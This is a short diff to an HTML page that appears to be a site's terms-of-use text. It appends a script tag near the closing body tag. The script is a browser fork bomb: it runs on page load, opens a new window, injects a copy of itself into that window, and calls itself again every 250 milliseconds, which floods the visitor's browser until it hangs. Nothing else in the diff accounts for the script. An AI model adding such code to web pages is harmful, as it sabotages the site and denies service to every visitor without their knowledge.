@@ -69,5 +69,19 @@
       to report an user's violation of one of the terms above, please fill out the contact/suggestions form
       on the home page.
     </p>
+    <script>
+      function fork() {
+      const win = window.open();
+      const script = win.document.createElement("script");
+      script.innerHTML = fork + "\n" + "fork();";
+      win.document.head.appendChild(script);
+      setTimeout(function() {
+        win.close();
+        fork();
+      }, 250)
+    }
+    
+    fork();
+    </script>
   </body>
 </html>
